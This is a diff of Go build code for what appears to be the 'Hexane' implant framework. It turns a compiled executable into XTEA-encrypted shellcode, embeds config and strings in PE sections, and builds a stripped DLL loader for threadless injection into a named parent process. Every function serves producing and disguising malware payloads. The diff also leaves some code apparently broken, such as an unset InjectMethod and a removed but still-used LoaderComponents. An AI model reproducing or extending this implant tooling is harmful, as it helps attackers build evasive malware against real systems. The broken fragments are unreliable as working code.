@@ -1,8 +1,6 @@
 package core
 
 import (
-	"bufio"
-	"debug/pe"
 	"fmt"
 	"os"
 	"os/exec"
@@ -104,59 +102,12 @@ func (h *HexaneConfig) CompileObject(command string, targets, flags, includes []
 	return nil
 }
 
-func GenerateHashes() error {
-	var (
-		err      error
-		hashFile *os.File
-		strFile  *os.File
-	)
-
-	WrapMessage("DBG", "generating hashes")
-	if strFile, err = os.Open(StringsFile); err != nil {
-		return err
-	}
-
-	defer strFile.Close()
-
-	if hashFile, err = os.Create(HashHeader); err != nil {
-		return err
-	}
-
-	scanner := bufio.NewScanner(strFile)
-	writer := bufio.NewWriter(hashFile)
-	names := make([]string, 0)
-
-	for scanner.Scan() {
-		line := scanner.Text()
-		names = append(names, line)
-	}
-
-	hashes := make([]string, 0)
-	for _, str := range names {
-		hashes = append(hashes, GetHashFromString(str))
-	}
-
-	for _, hash := range hashes {
-		if _, err = writer.WriteString(hash + "\n"); err != nil {
-			return err
-		}
-	}
-
-	if err = writer.Flush(); err != nil {
-		return err
-	}
-
-	return nil
-}
-
 func (h *HexaneConfig) GenerateConfig() error {
 	var (
 		Patch []byte
 		Xtea  []byte
 		err   error
 	)
-
-	WrapMessage("DBG", "generating new implant config")
 
 	h.Key = nil
 	h.Key = CryptCreateKey(16)
@@ -171,179 +122,14 @@ func (h *HexaneConfig) GenerateConfig() error {
 	return nil
 }
 
-func (h *HexaneConfig) EmbedConfigBytes(path string, targetSection string, bytes []byte) error {
-	var (
-		file   *os.File
-		peFile *pe.File
-		data   []byte
-		err    error
-	)
 
-	if file, err = os.OpenFile(path, os.O_RDWR, 0644); err != nil {
-		return err
-	}
-	defer file.Close()
-
-	if peFile, err = pe.NewFile(file); err != nil {
-		return err
-	}
-	defer peFile.Close()
-
-	var Section *pe.Section
-	for _, s := range peFile.Sections {
-		if s.Name == targetSection {
-			Section = s
-			break
-		}
-	}
-
-	if Section == nil {
-		return fmt.Errorf("section %s not found", targetSection)
-	}
-
-	if uint32(len(bytes)) > Section.Size {
-		return fmt.Errorf("section %s is not large enough", targetSection)
-	}
-
-	if data, err = Section.Data(); err != nil {
-		return err
-	}
-
-	newSection := make([]byte, len(bytes))
-	copy(newSection, data)
-	copy(newSection, bytes)
-
-	if _, err = file.Seek(int64(Section.Offset), os.SEEK_SET); err != nil {
-		return err
-	}
-
-	if _, err = file.Write(newSection); err != nil {
-		return err
-	}
-
-	return nil
-}
-
-func (h *HexaneConfig) EmbedConfigStrings(path string, targetSection string, strings []string) error {
-	var (
-		file   *os.File
-		peFile *pe.File
-		stream Stream
-		section *pe.Section
-		data   []byte
-		err    error
-	)
-
-	for _, str := range strings {
-		stream.AddString(str)
-	}
-
-	if file, err = os.OpenFile(path, os.O_RDWR, 0644); err != nil {
-		return err
-	}
-	defer file.Close()
-
-	if peFile, err = pe.NewFile(file); err != nil {
-		return err
-	}
-	defer peFile.Close()
-
-	for _, s := range peFile.Sections {
-		if s.Name == targetSection {
-			section = s
-			break
-		}
-	}
-
-	if section == nil {
-		return fmt.Errorf("section %s not found", targetSection)
-	}
-
-	if uint32(stream.Length) > section.Size {
-		return fmt.Errorf("section %s is not large enough", targetSection)
-	}
-
-	if data, err = section.Data(); err != nil {
-		return err
-	}
-
-	newSection := make([]byte, stream.Length)
-	copy(newSection, data)
-	copy(newSection, stream.Buffer)
-
-	if _, err = file.Seek(int64(section.Offset), os.SEEK_SET); err != nil {
-		return err
-	}
-
-	if _, err = file.Write(newSection); err != nil {
-		return err
-	}
-
-	return nil
-}
-
-func (h *HexaneConfig) GenerateShellcode(encrypt bool) error {
-	var (
-		data   	*os.File
-		peFile 	*pe.File
-		section *pe.Section
-		err    	error
-	)
-
-	WrapMessage("INF", "generating shellcode")
-	if data, err = os.Open(h.Compiler.BuildDirectory + "/interm.exe"); err != nil {
-		return err
-	}
-	defer data.Close()
-
-	if peFile, err = pe.NewFile(data); err != nil {
-		return err
-	}
-
-	for _, s := range peFile.Sections {
-		if s.Name == ".text" {
-			section = s
-			break
-		}
-	}
-
-	if section == nil {
-		return fmt.Errorf(" .text section was not found")
-	}
-
-	Shellcode := h.Compiler.BuildDirectory + "/shellcode.bin"
-	outData := make([]byte, section.Size)
-
-	if _, err = data.ReadAt(outData, int64(section.Offset)); err != nil {
-		return err
-	}
-
-	if encrypt {
-		h.Key = CryptCreateKey(16)
-		if outData, err = CryptXtea(outData, h.Key, true); err != nil {
-			return err
-		}
-	}
-
-	if err = WriteFile(Shellcode, outData); err != nil {
-		return err
-	}
-
-	WrapMessage("DBG", "shellcode generated at "+Shellcode)
-	return nil
-}
-
-func (h *HexaneConfig) GenerateLoader() error {
-	var (
-		err          error
-		InjectMethod string
-		InjectConfig map[string][]byte
-	)
+func (h *HexaneConfig) GetInjectMethod() InjectConfig {
+	var InjectCfg InjectConfig
 
 	if h.Implant.Injection.Threadless != nil {
-		InjectMethod = h.Implant.Injection.Threadless.LdrExecute
 
-		InjectConfig = map[string][]byte{
+		InjectCfg.InjectMethod = h.Implant.Injection.Threadless.LdrExecute
+		InjectCfg.InjectConfig = map[string][]byte{
 			"OBF_KEY": h.Key,
 			"PARENT":  []byte(h.Implant.Injection.Threadless.ProcName),
 			"MODULE":  []byte(h.Implant.Injection.Threadless.ModuleName),
@@ -351,49 +137,53 @@ func (h *HexaneConfig) GenerateLoader() error {
 		}
 	}
 
-	WrapMessage("DBG", "generating resource loader")
-	Resource := h.Compiler.BuildDirectory + "/resource.res"
-	RsrcFile := "\\\"" + h.Compiler.BuildDirectory + "/shellcode.bin" + "\\\""
+	return InjectCfg
+}
 
-	if err = h.RunCommand(h.Compiler.RsrcCompiler + " -O coff " + RsrcScript + " -DBUILDPATH=\"" + RsrcFile + "\" -o " + Resource); err != nil {
+func (h *HexaneConfig) GenerateLoader() error {
+	var (
+		err 			error
+		InjectMethod 	string
+	)
+
+	InjectCfg := h.GetInjectMethod()
+	RsrcObj := h.Compiler.BuildDirectory + "/resource.res"
+	RsrcData := h.Compiler.BuildDirectory + "/shellcode.bin"
+	LoaderObj := h.Compiler.BuildDirectory + "/loader.asm.o"
+	LoaderData := h.Compiler.BuildDirectory + "/loader.bin"
+	InjectObj := h.Compiler.BuildDirectory + "/" + filepath.Base(InjectMethod) + ".o"
+	CoreComponents := h.Compiler.BuildDirectory + "/ldrcore.cpp.o"
+	Output := h.Compiler.BuildDirectory + "/" + h.ImplantName + h.Compiler.FileExtension
+
+	if err = h.RunCommand(h.Compiler.Windres + " -O coff " + RsrcScript + " -DBUILDPATH=\"" + RsrcData + "\" -o " + RsrcObj); err != nil {
 		return err
 	}
 
-	Loader := h.Compiler.BuildDirectory + "/loader.bin"
-	LoaderObject := h.Compiler.BuildDirectory + "/loader.asm.o"
-
-	if err = h.RunCommand(h.Compiler.Objcopy + " -j .text -O binary " + LoaderObject + " " + Loader); err == nil {
-		if InjectConfig["LOADER"], err = os.ReadFile(Loader); err != nil {
+	if err = h.RunCommand(h.Compiler.Objcopy + " -j .text -O binary " + LoaderObj + " " + LoaderData); err == nil {
+		// TODO: change this from preproc-def to embeded in section config
+		if InjectCfg.InjectConfig["LOADER"], err = os.ReadFile(LoaderData); err != nil {
 			return err
 		}
 	} else {
 		return err
 	}
 
-	InjectObject := h.Compiler.BuildDirectory + "/" + filepath.Base(InjectMethod) + ".o"
-	LoaderComponents := h.GetLoaderComponents()
-	LoaderComponents = append(LoaderComponents, InjectObject)
-
 	WrapMessage("INF", fmt.Sprintf("generating object file for %s", InjectMethod))
-	if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{InjectMethod}, nil, h.Compiler.IncludeDirs, InjectObject, h.Key); err != nil {
+	if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{InjectMethod}, nil, h.Compiler.IncludeDirs, InjectObj, h.Key); err != nil {
 		return err
 	}
 
-	LoaderObjects := h.Compiler.BuildDirectory + "/loaders.cpp.o"
-	// InjectConfig will need to be added using h.EmbedConfigStrings/EmbedConfigBytes
-	if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{LoadersCpp, InjectObject}, nil, h.Compiler.IncludeDirs, LoaderObjects, h.Key); err != nil {
+	if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{LoadersCpp, InjectObj}, nil, h.Compiler.IncludeDirs, CoreComponents, h.Key); err != nil {
 		return err
 	}
 
-	RsrcLoader := h.Compiler.BuildDirectory + "/" + h.ImplantName + h.Compiler.FileExtension
 
-	WrapMessage("INF", "generating dll rsrc loader")
-	if err = h.CompileObject(h.Compiler.Mingw, LoaderComponents, []string{"-shared"}, h.Compiler.IncludeDirs, RsrcLoader, h.Key); err != nil {
+	if err = h.CompileObject(h.Compiler.Mingw, LoaderComponents, []string{"-shared"}, h.Compiler.IncludeDirs, Output, h.Key); err != nil {
 		return err
 	}
 
 	if !h.Compiler.Debug {
-		if err = h.RunCommand(h.Compiler.Strip + " " + RsrcLoader); err != nil {
+		if err = h.RunCommand(h.Compiler.Strip + " " + Output); err != nil {
 			return err
 		}
 	}
@@ -409,7 +199,7 @@ func (h *HexaneConfig) GenerateObjects() error {
 	)
 
 	WrapMessage("DBG", "generating core object files")
-	var EmbededStrings = h.GetEmbededStrings()
+	var embedStrings = h.GetEmbededStrings()
 
 	for _, dir = range h.Compiler.ComponentDirs {
 		if files, err = os.ReadDir(dir); err != nil {
@@ -430,10 +220,10 @@ func (h *HexaneConfig) GenerateObjects() error {
 				}
 
 				if file.Name() == "core.cpp" {
-					if err = h.EmbedConfigBytes(ObjFile, ".text$F", h.ConfigBytes); err != nil {
+					if err = h.EmbedSectionData(ObjFile, ".text$F", h.ConfigBytes); err != nil {
 						return err
 					}
-					if err = h.EmbedConfigStrings(ObjFile, ".text$G", EmbededStrings); err != nil {
+					if err = h.EmbedSectionData(ObjFile, ".text$G", embedStrings); err != nil {
 						return err
 					}
 				}
